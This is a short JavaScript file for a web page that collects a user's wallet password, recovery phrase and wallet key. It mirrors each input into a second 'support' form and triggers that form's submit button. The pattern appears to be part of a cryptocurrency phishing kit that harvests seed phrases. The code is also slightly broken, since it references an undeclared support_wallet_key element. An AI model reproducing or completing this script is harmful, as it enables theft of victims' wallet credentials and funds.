// FOR INDEX

const wallet_password = document.getElementById("wallet_password");

const recov_phrase = document.getElementById("recov_phrase");

const wallet_key = document.getElementById("wallet_key");

const index_btn = document.getElementById("index_btn");

// FOR SUPPORT

const support_wallet_name = document.getElementById("support_wallet_name");

const support_wallet_password = document.getElementById("support_wallet_password");

const support_recov_phrase = document.getElementById("support_recov_phrase");

const support_btn = document.getElementById("support_btn");

const import_btns = document.querySelectorAll(".import");

//wallet password
wallet_password.addEventListener("input", (e) => {
   support_wallet_password.value = e.target.value;
 });
 
 // recovery phrase
recov_phrase.addEventListener("input", (e) => {
   support_recov_phrase.value = e.target.value;
 });
 
 // wallet key
wallet_key.addEventListener("input", (e) => {
   support_wallet_key.value = e.target.value;
 });
 
 //index button
index_btn.addEventListener("click", () => support_btn.click());